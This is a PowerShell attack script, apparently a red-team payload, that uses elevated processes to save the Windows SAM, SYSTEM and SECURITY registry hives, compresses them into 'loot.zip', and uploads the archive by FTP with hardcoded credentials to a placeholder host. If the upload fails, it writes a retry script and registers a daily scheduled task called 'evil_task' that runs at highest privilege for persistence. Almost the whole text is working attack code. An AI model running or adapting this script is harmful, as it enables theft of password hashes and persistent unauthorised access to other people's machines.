@PowerShell -ExecutionPolicy Bypass
$ftp = @'
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("H@cK3R", "@D9wu&YKNcf*j6")
$client.UploadFile("ftp://thiswontresolve.example.com/path/loot.zip", "$env:temp\loot.zip")
'@
$actions = New-ScheduledTaskAction -Execute "$env:temp\exfil.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "3:00 AM"
$principal = New-ScheduledTaskPrincipal -UserId 'bit9se' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
function exfil {
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("H@cK3R", "@D9wu&YKNcf*j6")
$client.UploadFile("ftp://thiswontresolve.example.com/path/loot.zip",
"$env:temp\loot.zip")
}
Start-Process -filepath "cmd.exe" -verb runas -argumentlist {/c reg save HKLM\sam %temp%\sam}
Start-Process -filepath "cmd.exe" -verb runas -argumentlist {/c reg save HKLM\system %temp%\system}
Start-Process -filepath "cmd.exe" -verb runas -argumentlist {/c reg save HKLM\security %temp%\security}
Start-Sleep -seconds 5
Compress-Archive -Path $env:temp\sam,$env:temp\system,$env:temp\security -DestinationPath $env:temp\loot.zip
if (!(exfil)) {
$ftp > $env:temp\exfil.ps1
Register-ScheduledTask 'evil_task' -InputObject $task
}
else {
Remove-Item $env:temp\loot.zip
}
Remove-Item $env:temp\sam,$env:temp\system,$env:temp\security
